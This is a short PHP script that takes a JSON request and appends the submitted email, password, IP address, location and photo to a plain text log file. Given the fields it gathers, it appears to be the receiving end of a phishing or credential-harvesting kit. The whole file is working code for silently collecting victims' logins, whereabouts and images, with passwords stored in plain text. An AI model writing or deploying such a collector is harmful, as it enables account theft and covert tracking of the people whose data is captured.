<?php
$data = json_decode(file_get_contents('php://input'), true);
$email = $data['email'];
$password = $data['password'];
$ip = $data['ip'];
$location = $data['location'];
$photo = $data['photo'];
$file = fopen('log.txt', 'a');
fwrite($file, "Email: $email\r\n");
fwrite($file, "Password: $password\r\n");
fwrite($file, "IP: $ip\r\n");
fwrite($file, "Location: $location\r\n");
fwrite($file, "Photo: $photo\r\n\r\n");
fclose($file);
?>
